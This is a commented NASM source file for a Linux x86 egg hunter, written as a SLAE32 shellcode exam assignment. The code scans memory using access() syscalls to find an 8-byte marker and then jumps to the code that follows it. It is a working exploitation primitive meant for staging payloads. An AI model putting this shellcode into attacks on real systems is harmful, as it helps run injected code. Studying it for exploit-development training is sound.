; egg_hunter_access_2_x86.nasm
; Author: Jack McBride (PA-6483)
; Website: https://jacklgmcbride.co.uk
;
; Purpose: SLAE32 exam assignment
;
; Assignment 3: Linux x86 Egg Hunter Shellcode

global _start

section .text

_start:

_setup:

	xor edx, edx;			Clear EDX register
	
_loop_inc_page:
	
	or dx, 0xfff;			Go to last address in the memory page

_loop_inc_one:

	inc edx;			Increase the memory counter by 1

_loop_check:

	lea ebx,[edx+0x4];		Set EBX to the pathname pointer
	
	push byte +0x21;		Push 0x21 to the stack

	pop eax;			POP the 0x21 value into EAX register
	
	int 0x80;			Execute access() syscall
	
	cmp al, 0xf2;			Check if result is an access violation
	
_loop_check_valid:
	
	jz _loop_inc_page;		If access violation, jump to next page in memory
	
	mov eax, 0x50905090;		Move the egg pattern into EAX register

	mov edi, edx;			Move the memory page to be scanned into EDI

	scasd;				Compare EAX and EDI for first half of egg

	jnz _loop_inc_one;		If no match, increment memory counter by one

	scasd;				Compare EAX and EDI for second half of egg
	
	jnz _loop_inc_one;		If no match, increment memory counter by one

_matched:
	
	jmp edi;			If match, jmp to memory address containing egg
